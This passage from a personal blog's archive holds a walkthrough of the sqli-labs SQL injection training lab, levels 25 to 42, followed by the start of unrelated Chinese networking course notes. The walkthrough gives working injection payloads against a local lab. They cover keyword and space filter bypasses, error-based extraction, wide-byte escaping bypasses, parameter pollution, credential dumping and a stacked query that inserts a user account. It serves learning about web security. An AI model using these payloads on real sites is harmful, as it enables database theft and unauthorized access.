alt="2024-11-27 192955"></p><p>此时显示用户仍为admin’#，先输入原设置的密码，再更改密码为111，点击reset，跳转到页面显示 <em>Password successfully updated</em>；</p><p>之后登出，再进入输入账户与密码的页面，此时可以输入用户名admin，密码则为刚刚更改的密码111，则可以登录上admin的账号了；</p><p><img src="/2025/07/11/sqli-labs/2024-11-27193506.png" alt="2024-11-27 193506"></p><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><h3 id="and、or-过滤"><a href="#and、or-过滤" class="headerlink" title="and、or 过滤"></a>and、or 过滤</h3><p>打开页面显示如下图，<img src="/2025/07/11/sqli-labs/2024-11-27193716.png" alt="2024-11-27 193716"></p><p>（上图最下一行会显示传入的id参数为啥）</p><p>先输入&#x2F;?id&#x3D;1’  ,可判断闭合符号为单引号；</p><p>输入：?id&#x3D;1’ and 1&#x3D;1–+ </p><p>显示有：Hint: Your Input is Filtered with following result: 1’ 1&#x3D;1–</p><p>可见and 确实被过滤了；</p><p>尝试绕过对and：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; anandd 1=1--+ //复写and，hint显示1&#x27; and 1=1--，成功绕过</span><br></pre></td></tr></table></figure><p>但注释符被过滤了，故在末尾多加一个闭合符号，尝试后可行；</p><p>进行注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27;union select 1,2,3&#x27;  //页面正常显示，列数为3</span><br><span class="line">/?id=-1&#x27;union select 1,2,3&#x27; //判断出2，3为回显位</span><br><span class="line">/?id=-1&#x27;union select 1,2,database()&#x27; //判断出库名</span><br><span class="line">?id=-1&#x27;union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27;)&#x27;  //这里注意information里双写or，后续语句同理</span><br></pre></td></tr></table></figure><p>最后得：<img src="/2025/07/11/sqli-labs/2024-11-27203113.png" alt="2024-11-27 203113"></p><h2 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h2><h3 id="无法报错注入但能联合等等注入"><a href="#无法报错注入但能联合等等注入" class="headerlink" title="(无法报错注入但能联合等等注入)"></a>(无法报错注入但能联合等等注入)</h3><p>当输入&#x2F;?id&#x3D;1  页面正常显示信息（有回显位，该题能用联合注入）</p><p>当输入&#x2F;?id&#x3D;1’等等<strong>均</strong>显示异常为 <em>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in C:\phpstudy_pro\WWW\sql\Less-25a\index.php on line 37</em></p><p>（该题不能用报错注入）</p><p>故可判断为数值型*（后话：其实最先开始应该先判断是数字型还是字符型的，可以少绕弯路）*，因为能回显信息，可以使用union注入；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=-1 union select 1,2,3#  //判断出2、3为回显位</span><br><span class="line">/?id=-1 union select 1,2,database()#   //判断出库名，后续语句同理</span><br></pre></td></tr></table></figure><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>页面有显示: <em>all your spaces and comments belong to us.</em></p><p>经尝试，该题and、or、注释符、空格均被过滤；</p><p>先根据报错提示，判断出闭合符号为单引号；</p><p>此题绕过注释符方法为在句尾加’1’&#x3D;’1 （用less-23的没法绕过此题)</p><p>尝试用+、url编码绕过空格失败，<br>尝试<strong>报错注入加多用括号</strong>代替：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27;anandd(extractvalue(1,concat(&#x27;~&#x27;,(database()))))oorr&#x27;1&#x27;=&#x27;1  //得库名</span><br><span class="line">?id=1&#x27;anandd(extractvalue(1,concat(&#x27;~&#x27;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)))))oorr&#x27;1&#x27;=&#x27;1  //得表名，后续同理</span><br></pre></td></tr></table></figure><h2 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h2><h3 id="不用报错判断闭合"><a href="#不用报错判断闭合" class="headerlink" title="不用报错判断闭合"></a>不用报错判断闭合</h3><p>该题and、or、注释符、空格被过滤；</p><p>先判断闭合符号：</p><ul><li><p>输入&#x2F;?id&#x3D;1或者1”   页面均正常回显信息（有回显位，该题能用联合注入）</p></li><li><p>输入&#x2F;?id&#x3D;1’,显示 <em>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in C:\phpstudy_pro\WWW\sql\Less-26a\index.php on line 36</em>（该题也不能用报错注入）</p></li></ul><p> —》字符型，有单引号，但<strong>还得再判断是否有括号：</strong></p><p>这里输入&#x2F;?id&#x3D;1’)%26%26(‘1’)&#x3D;(‘1  页面正常回显说明有小括号</p><p><img src="/2025/07/11/sqli-labs/2024-11-28113526.png" alt="2024-11-28 113526"></p><p>（注意，若用?id&#x3D;1’||’ 和?id&#x3D;1’||1’ 会让我们误判为就是单引号字符型注入，因为带入源码中id&#x3D;(‘1’||’’)和id&#x3D;(‘1’||’1’)返回的结果都会是id&#x3D;1）</p><p>绕过空格：经过尝试，在该题%0B可以；</p><p>进行union联合注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27;)%0Bunion%0Bselect%0B1,database(),3%0B||(&#x27;1&#x27;)=(&#x27;1   //库名</span><br><span class="line">/?id=&#x27;)%0Bunion%0Bselect%0B1,(select%0Bgroup_concat(table_name)%0Bfrom%0Binfoorrmation_schema.tables%0Bwhere%0Btable_schema=&#x27;security&#x27;),3%0B||(&#x27;1&#x27;)=(&#x27;1   //表名，后续同理</span><br></pre></td></tr></table></figure><p><strong>补充：</strong>（摘自：<a href="https://blog.csdn.net/m0_46315342/article/details/106557886%EF%BC%89">https://blog.csdn.net/m0_46315342/article/details/106557886）</a></p><h4 id="此题判断小括号的几种方法："><a href="#此题判断小括号的几种方法：" class="headerlink" title="此题判断小括号的几种方法："></a><strong>此题判断小括号的几种方法</strong>：</h4><ol><li><pre><code>2&#39;&amp;&amp;&#39;1&#39;=&#39;1 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">（    浏览器过滤了&amp;，所以测试时使用url编码%26 即2&#x27;%26%26&#x27;1&#x27;=&#x27;1   ）</span><br><span class="line"></span><br><span class="line">- 若查询语句为`where id=&#x27;$id&#x27;`，查询时是`where id=&#x27;2&#x27;&amp;&amp;&#x27;1&#x27;=&#x27;1&#x27;`，结果是`where id=&#x27;2&#x27;`，回显会是`id=2`。</span><br><span class="line">- 若查询语句为`where id=(&#x27;$id&#x27;)`，查询时是`where id=(&#x27;2&#x27;&amp;&amp;&#x27;1&#x27;=&#x27;1&#x27;)`，MySQL 将`&#x27;2&#x27;`作为了 Bool 值，结果是`where id=(&#x27;1&#x27;)`，回显会是`id=1`。</span><br><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   1&#x27;)||&#x27;1&#x27;=(&#x27;1</span><br></pre></td></tr></table></figure>   若查询语句有小括号正确回显，若无小括号错误回显（无回显）。</code></pre></li></ol><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><h3 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h3><p>页面有显示： <em>all your union and select belong to us</em></p><p>经尝试该题的空格(可由%0b绕过）、注释符（可由and’1’&#x3D;’1或者直接 ‘ 绕过）也被过滤了，and和or没被过滤</p><p>先输入?id&#x3D;1’ ，有报错提示，判断出闭合符号为单引号；</p><p>该题可以大小写绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&#x27;unIon%0bseLect%0B1,2,database()&#x27; //库名，后续同理；</span><br></pre></td></tr></table></figure><h2 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h2><h3 id="不用报错判断闭合-1"><a href="#不用报错判断闭合-1" class="headerlink" title="不用报错判断闭合"></a>不用报错判断闭合</h3><p>过滤了注释符、union select；</p><p><strong>判断闭合方式：</strong></p><ul><li><p>输入1或者1’均正常显示，1“报错但无具体报错信息,再换个方法</p></li><li><p>尝试输入</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27;and &#x27;1 //页面正常显示</span><br><span class="line">/?id=1&#x27;and &#x27;0 //页面正常显示</span><br><span class="line">--&gt;闭合符号不是&#x27;</span><br><span class="line">1&quot;and&quot;1 //页面正常显示</span><br><span class="line">1&quot;and&quot;0 //页面显示错误</span><br><span class="line">--&gt;闭合符号为&quot;</span><br></pre></td></tr></table></figure><p>进行union注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&quot;unioN%0bseLect%0b1,2,3&quot;   //可以用大小写来绕过，后续同理less-27</span><br></pre></td></tr></table></figure><h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>闭合判断方式同less-27a</p><p>当输入&#x2F;?id&#x3D;1’and ‘1与&#x2F;?id&#x3D;1显示的界面一致，</p><p>当输入 &#x2F;?id&#x3D;1’and ‘0 ，显示如下图，</p><p>说明页面正确地对语句进行了判断；</p><p><img src="/2025/07/11/sqli-labs/2024-11-28133403.png" alt="2024-11-28 133403"></p><p>—&gt;闭合有单引号，再判断是否有括号：</p><p>?id&#x3D;2’and’1’&#x3D;’1 显示出id为1的用户信息，故有括号；</p><p>—》闭合方式为单引号加单括号；</p><p>进行union注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&#x27;)unIon%0bselECt%0b1,2,3%0bor(&#x27;  //这里写成/?id=0&#x27;)unIon%0bselECt%0b1,2,3%0b(&#x27;不通过</span><br><span class="line">/?id=0&#x27;)unIon%0bselECt%0b1,database(),0%0bor(&#x27;  //库名，后续同理</span><br></pre></td></tr></table></figure><h2 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h2><p>输入2-1得id为2的用户信息，故为字符型；</p><p>虽输入&#x2F;?id&#x3D;1’)显示异常，继续尝试</p><ul><li>&#x2F;?id&#x3D;1’)and(‘1    页面显示正常</li><li>&#x2F;?id&#x3D;1’)and(‘0   页面无显示</li></ul><p>说明闭合符号为单引号加括号；</p><p>后续与less-28同理，且该关只过滤了union select</p><h2 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h2><h3 id="双服务器、参数污染"><a href="#双服务器、参数污染" class="headerlink" title="双服务器、参数污染"></a>双服务器、参数污染</h3><p><strong>分析：</strong></p><p>打开页面有显示 <em>this site protected by world’s best firewall</em></p><p>(其实Less-29需要两层服务器架构，在做题前应该下载jsp服务器。参考：<a href="https://www.jianshu.com/p/46cb6c354de5">https://www.jianshu.com/p/46cb6c354de5</a> )<br>      “在ID后面输入id&#x3D;1&amp;id&#x3D;2，网站到底会去执行哪个ID呢，这里需要看我们使用的web容器，如果我们使用的web容器为apache，则会执行id&#x3D;2，如果为tomcat，则会执行id&#x3D;1，这里我的web容器为apache，所以会执行id&#x3D;2”</p><p>”<strong>HPP (HTTP Parameter Pollution)</strong>，也就是 HTTP 参数污染。我们注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入。“</p><p>输入?id&#x3D;1’  跳转到&#x2F;login.php&#x2F;hacked.php网页下，</p><p><a href="http://127.0.0.1/sql/Less-29/hacked.php%EF%BC%8C%E6%AD%A4%E4%B8%BA%E8%A2%ABwaf%E6%8B%A6%E6%88%AA%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E9%A1%B5%E9%9D%A2%E6%9C%89%E6%98%BE%E7%A4%BA%EF%BC%9A">http://127.0.0.1/sql/Less-29/hacked.php，此为被waf拦截的页面，页面有显示：</a> <em>go back and try again</em> ，点击后进入login.php的网页；</p><p>输入?id&#x3D;1&amp;&amp;id&#x3D;2，网页回到 &#x2F;login.php&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2 下，且网页正常执行，显示id为2的用户信息；</p><p>&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2’ 显示报错 *near ‘’2’’ LIMIT 0,1’ * ，可知为单引号闭合；</p><p>进行union注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&amp;&amp;id=0&#x27;union select 1,2,database()--+</span><br></pre></td></tr></table></figure><p>显示库名，后续同理less-1；</p><h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>同理less-29，只是输入&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2’不显示报错信息，正常显示id为2的用户信息；</p><p>进行闭合判断：</p><p>法一：输入&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2” ，显示报错信息 <em>‘“2”” LIMIT 0,1’</em></p><p>法二：</p><ul><li>&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2”and 1&#x3D;0–+   网页异常</li><li>&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2”and 1&#x3D;1–+   网页正常显示id为2的用户信息</li></ul><p>—-&gt;闭合方式为双引号；后续与less-29同理；</p><h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p><a href="http://127.0.0.1/sql/Less-31/login.php/?id=1&&id=2">http://127.0.0.1/sql/Less-31/login.php/?id=1&amp;&amp;id=2</a>“  可由报错信息判断出为)”闭合，后续同理less-29；</p><h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><h3 id="宽字节绕过-get型"><a href="#宽字节绕过-get型" class="headerlink" title="宽字节绕过(get型)"></a>宽字节绕过(get型)</h3><p>当输入 &#x2F;?id&#x3D;1’<br>页面有显示：Hint: The Query String you input is escaped as : 1\‘</p><p>(or:<code>1</code>、<code>1&#39;</code>、<code>1&quot;</code>都能正常回显，可以猜测输入的引号被过滤，从页面给的 hint 也证实了这一点。)</p><p>且由标题可知，addslashes()函数转义了引号；</p><p>在单引号前加**%df** ，有显示报错信息： ‘’1�&#39;‘ LIMIT 0,1’ </p><p>判断出为单引号闭合；且当输入&#x2F;?id&#x3D;1%df’–+ 页面正常显示id为1的信息；</p><p>后续使用union注入即可：</p><h4 id="但注意！"><a href="#但注意！" class="headerlink" title="但注意！"></a>但<strong>注意！</strong></h4><p>该题使用addslashes函数对于输入的内容进行转义，故当使用union注入要用到**’users’<strong>时，不能用<em>table_name&#x3D;%df”users%df”</em>，因为会被视为users�，可将表名换成</strong>十六进制编码**，即<em>table_name&#x3D;0x7573657273</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/?id=0 union select 1,database(),3--+  //库名</span><br><span class="line"> </span><br><span class="line">/?id=0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database() ) ,3--+    //表名</span><br><span class="line"> </span><br><span class="line">/?id=0 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273) ,3--+   //字段，注意users换为16进制编码</span><br><span class="line"> </span><br><span class="line">?id=-1%df%27%20union%20select%201,group_concat(password,username),3%20from%20users--+</span><br></pre></td></tr></table></figure><p><img src="/2025/07/11/sqli-labs/2024-11-30090632.png" alt="2024-11-30 090632"></p><p>（注意：数据库为gbk时可使用%df绕过）</p><p>%df 可以换为<code>%bb%27</code>或<code>%bb%5c%5c%27</code>代替<br>（%5c ☞ \  ）</p><h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>与less-32一致…</p><h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><h3 id="宽字节绕过-post型！"><a href="#宽字节绕过-post型！" class="headerlink" title="宽字节绕过(post型！)"></a>宽字节绕过(post型！)</h3><p>在username处输入 admin’  </p><p><img src="/2025/07/11/sqli-labs/2024-11-30091306.png" alt="2024-11-30 091306"></p><p>可知引号被转义了；（在password处输入也被转义）</p><p>在username处输入 admin%df’  （或者在hackbar输入）,页面无回显，<strong>原因</strong>：</p><p> 在post中， %经过url编码会变为%25</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get与post提交数据的不同，get型直接以url形式提交，也就是说遇到%bb,%27这种直接当做url编码后处理，而post型却不是这样，他会把你提交的%bb,%27当做正常数据，然后进行url编码，于是就变成了%25bb,%2527</span><br></pre></td></tr></table></figure><p>（摘自、详细见：<a href="https://blog.csdn.net/weixin_39934520/article/details/105896415">Sqli-labs之Less-34_sqli34-CSDN博客</a>）</p><p><strong>使用burp来post参数：</strong></p><p>1.先输入在网页输入，burp拦截</p><p><img src="/2025/07/11/sqli-labs/2024-11-30094746.png" alt="2024-11-30 094746"></p><p>2.将burp中最后一行多出的25删去，即变为:</p><p><em>uname&#x3D;admin%df%27&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</em></p><p>3.后续进行union注入即可，像输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df%27union select 1,database()--+ &amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="/2025/07/11/sqli-labs/2024-11-30100410.png" alt="2024-11-30 100410"></p><h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><p>此题为get型，</p><p>输入id&#x3D;1与2-1均显示id为1的用户信息，判断为数值型；</p><h5 id="判断注释符哪个能用的例子："><a href="#判断注释符哪个能用的例子：" class="headerlink" title="判断注释符哪个能用的例子："></a>判断注释符哪个能用的例子：</h5><p>方法一：（此关）</p><ul><li>&#x2F;?id&#x3D;1 group by 3#1<ul><li><em>Hint: The Query String you input is escaped as : 1 group by 3</em></li></ul></li><li>?id&#x3D;1 group by 3–+1<ul><li>Hint: The Query String you input is escaped as : 1 group by 3– 1</li></ul></li></ul><p>—&gt; 该题注释符可以用–+</p><p>方法二：（若能显示报错信息）</p><p>当输入&#x2F;?id&#x3D;1’  有报错信息，例如出现near ‘’ LIMIT 0,1’ ，闭合符号为单引号时，</p><ul><li>&#x2F;?id&#x3D;1’ –+ 无报错信息，页面正常 ，则–+可用</li><li>&#x2F;?id&#x3D;1’#  仍显示报错，则#不可用</li></ul><p>后续同理less-32进行联合注入；</p><h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>输入&#x2F;?id&#x3D;1’， 页面有显示<em>Hint: The Query String you input is escaped as : 1&#39;</em></p><p>输入&#x2F;?id&#x3D;1%df’   显示<em>near ‘’1�\‘’ LIMIT 0,1’</em>     判断出单引号闭合,</p><p>后续与less-32同理；</p><h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>get型，对引号会转义，判断出为单引号闭合；</p><p><img src="/2025/07/11/sqli-labs/2024-11-30111254.png" alt="2024-11-30 111254"></p><p>与less-34同理；</p><p>eg：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df%27union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273)--+&amp;passwd=&amp;submit=Submit    //字段</span><br></pre></td></tr></table></figure><h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>get型，输入&#x2F;?id&#x3D;1’  判断出单引号闭合；</p><p>后续union注入即可；</p><p>注：该关可以堆叠注入，因为存在mysqli_multi_query函数</p><ul><li>mysqli_multi_query支持多条sql语句同时进行。</li></ul><h2 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h2><p>输入&#x2F;?id&#x3D;1与&#x2F;?id&#x3D;2-1页面显示一致，为数字型；</p><p>后续同union联合注入；</p><h2 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h2><p>先判断出为字符型，无报错信息显示；</p><p>判断闭合符号：</p><ul><li>&#x2F;?id&#x3D;1’)and 0–+  页面无回显</li><li>&#x2F;?id&#x3D;1’)and 0–+  页面正常回显用户为1的信息</li></ul><p>为‘）闭合方式；</p><p>后续union注入即可；</p><h2 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h2><p>由&#x2F;?id&#x3D;1与&#x2F;?id&#x3D;2-1判断为数字型，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=0 union select 1,2,3--+  //判断出回显位为2，3</span><br></pre></td></tr></table></figure><p>后续union注入即可；</p><h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>打开的页面与less-24相同，但点击</p><ul><li>new user click here？<ul><li><em>if you need to create account ,then hack your way in</em></li></ul></li><li>forgot your password?<ul><li>if you forgot your password,go hack it</li></ul></li></ul><p>故要想办法去登录上一个账号；</p><p>在username处尝试注入，</p><ul><li>丢入引号均不报错，万能密码也没绕过，%df加引号也无效（看源码知此数据库不为gbk）</li></ul><p>在password处尝试注入，</p><ul><li>输入1’  ，有报错信息显示<em>near ‘’1’’’ at line 1</em>，<strong>故为单引号闭合，而不是双引号闭合</strong>，故此处有注入点；</li></ul><p>使用union注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select 1,2,3  //判断回显位</span><br></pre></td></tr></table></figure><p><img src="/2025/07/11/sqli-labs/2024-11-30160012.png" alt="2024-11-30 160012"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select 1,database(),2#   //库名，后续表名、列名同理；</span><br></pre></td></tr></table></figure><p>若想创建一个账号：</p><p>在password处进行堆叠注入，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;insert into users values(1999,&#x27;test&#x27;,&#x27;pass&#x27;)#</span><br></pre></td></tr></table></figure><p>之后显示异常页面，但回到登录页面，输入username为test，password为pass，即可登录成功；</p><img src="./2024-11-30160627.png" alt="2024-11-30 160627" style="zoom:67%;" />]]></content>
      
      
      
        <tags>
            
            <tag> sql、ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>network</title>
      <link href="/2025/07/11/network/"/>
      <url>/2025/07/11/network/</url>
      
        <content type="html"><![CDATA[<h1 id="引入"><a href="#引入" class="headerlink" title="引入:"></a>引入:</h1><p><strong>(建议全学完了再看一遍该节)</strong></p><p>每层提供的功能的目的是通过层间的接口向上层提供更好的服务；<br>而本层的功能的实现要通过层间的接口调用下层的服务才能实现；</p><p>互联网的RIP网络是按照分组交换的方式来工作的，而分组的交换会涉及到丢包，分组的传输会有延迟；<br>（RIP，即路由信息协议，是一种基于距离矢量的内部网关协议）</p><ol><li><p>应用层是借助传输层所提供的服务交换应用报文，实现各种各样的网络应用。</p></li><li><p>物理层是在媒体之上传输和接收电磁波信号、光信号；</p></li><li><p>链路层在相邻两个节点之间传输以帧为单位的数据，解决点到点的问题；</p></li><li><p>网络层在链路层所提供的相邻两点之间的传输的基础上实现主机原主机到目标主机之间的一个传输，拓展了数据链路层的功能，做到端与端的传输，但有不足。</p></li><li><p>传输层在网络层的基础上又加强、细分了网络层的服务，解决了进程到进程通信的最后一个问题。之后应用进程就可以按照应用层协议交换报文，实现各种各样的网络应用。</p><p>互联网只是网络的一种，只是它比较普及。</p></li></ol><h1 id="计算机网络和因特网"><a href="#计算机网络和因特网" class="headerlink" title="计算机网络和因特网"></a>计算机网络和因特网</h1><h2 id="1-what’s-Internet"><a href="#1-what’s-Internet" class="headerlink" title="1. what’s Internet"></a>1. what’s Internet</h2><p><strong>网络</strong>：由节点和边构成的与大小、形状无关的拓扑；</p><p><strong>计算机网络</strong>：联网的计算机所构成的系统，其包括的节点有：</p><p>**1.**主机节点：主机（e g：手机，联网的冰箱）及其上运行的应用程序，主机节点是数据的源也是数据的目标；</p><p>**2.**数据交换节点：如路由器、交换机等网络交换设备，它们既不是源也不是目标，而是数据的中转节点，进行转发数据，（路由器工作在网络层，交换机工作在链路层）；通过这些中转节点的相互配合，完成从源节点传输到目标节点。</p><ul><li>节点有两种画风，一个正方形□的为主机节点，一个圆形○的为数据交换节点。</li><li>对于边，只要与方的有关，就是<u>接入网链路</u>（access）；若为两个圆的接在一起就是<u>主干链路</u>（backbone）。</li><li>把节点连在一起的叫链路，最后构成一个网。</li></ul><p>所以说，联网的计算机系统有节点和边构成的这样的一个系统称为计算机网络。</p><p><strong>互联网&#x2F;Internet&#x2F;网际：</strong></p><ul><li><p>以TCP协议和IP协议为主的一簇协议支撑起工作的网络；</p></li><li><p>从构成的角度来看，是一堆的网络通过网络互联设备连在一起的巨型网络；</p></li><li><p>从服务的角度来看，是分布式的应用以及为分布式应用提供通信服务的基础设施</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（基础设施包括了 主机应用层以下的所有运行当中的协议实体，对方机应用进程以下的所有运行当中的应用实体，和all的网络部分）</span><br></pre></td></tr></table></figure></li><li><p>是基础设施和分布式应用；</p><ul><li>分布式的应用是网络存在的理由。</li><li>基础设施向应用进程提供服务的形式是api方式，但分为面向连接的服务（tcp提供）和无连接的服务（utp提供）两种形式。</li></ul></li></ul><p>注：内部网，internet；<br>       端系统，host，end system<br>       交换机switch，路由器router<br>       链路，link，重要的指标是带宽以bp s，即beat per second，每秒传输的位。</p><p><strong>协议</strong>：相当于标准，按照层次不同分为不同协议等，是对等层的实体在通信过程中遵循的规则的集合；</p><ul><li>比如像这边通信的tcp和另一边通信的tcp关系就是对等层的实体；</li><li>遵守同样协议的网络实体才能相互通行。</li><li>PDU，协议数据单元，在不同层上有不同特质，在应用层上叫message，在传输层上叫segment。</li><li>互联网中所有通信行为都受到协议的规范。</li></ul><h2 id="2-网络边缘"><a href="#2-网络边缘" class="headerlink" title="2.网络边缘"></a>2.网络边缘</h2><p>从结构的角度来，互联网包括3个<strong>子系统：</strong><br><strong>1.边缘系统</strong>：主机，应用程序（客户端和服务器）<br><strong>2.网络核心</strong>：互连着的路由器和交换机，网络的网络；</p><ul><li>起全球范围内几亿节点之间数据交换的作用（原主机发出去，目标主机能收到）；</li><li>实际上是由数百万个数据交换节点构成的分布式交换系统，由它们的互相配合发挥作用；</li><li>把所有的边缘节点连在一起，从而让任意两个端系统之间能够互相通信；</li></ul><p><strong>3.接入系统</strong>：形式为有线或者无线通信链路<br>     接入网：把网络边缘接入到网络核心</p><p><strong>应用进程之间通讯的模式：</strong></p><p><strong>1.c&#x2F;s模式（客户端服务器模式）：</strong></p><ul><li><p>是主从模式，“主”指all资源都在服务器那，“从”指客户端的请求的资源都来自服务器。</p></li><li><p>服务器先启动，客户端后启动；</p></li><li><p>客户端主动发出请求，请求资源；</p><p>服务器被动接受请求，响应后将处理后的结果、资源返回给客户端。</p></li><li><p>可扩展性较差，随着请求载荷增加，能力下降（当到达一定程度时，有断崖式下降）</p></li></ul><p><strong>2.P2P：</strong></p><ul><li><p>P指peer，对等体，也是分布式应用进程；</p></li><li><p>每个节点即是客户端，又是服务器；</p></li><li><p>通信分布式的；</p></li><li><p>当请求节点增多，但同时提供资源节点也增多；</p></li><li><p>在文件分发系统中常有，eg：迅雷。</p><p>下载资源会比在web网站快，因为如：可以向这个客户端下载文件的这个片段，又从另一个客户端下载文件的另个片段，还可以….,多条路径可同时下载，带宽聚集。</p></li></ul><p><strong>基础设施为网络应用提供的通信服务分两种方式：</strong>（后面章节会详细介绍）<br>1.面向连接通讯方式：如tcp协议实体向应用进程提供的服务；两个应用进程通信前打个招呼，两方和底层协议站要做好准备，但之间的节点不知道–&gt;通信的状态在端系统中维护；<br>2.无连接：UDP提供的服务，不可靠，没流量控制，没拥塞控制，适合网络多媒体应用。</p><p><strong>tcp向上层提供服务的特性：</strong><br>1.可靠：不重复、不失序、不出错、不丢失。<br>               发送方发送啥，接收方就接受到啥；<br>               也包括保续<br>2.流量控制<br>3.拥塞控制</p><h2 id="3-网络核心"><a href="#3-网络核心" class="headerlink" title="3.网络核心"></a>3.网络核心</h2><h3 id="实现网络核心交换数据作用的两个方式"><a href="#实现网络核心交换数据作用的两个方式" class="headerlink" title="实现网络核心交换数据作用的两个方式"></a>实现网络核心交换数据作用的两个方式</h3><p><strong>1.电路交换or线路交换（circuit  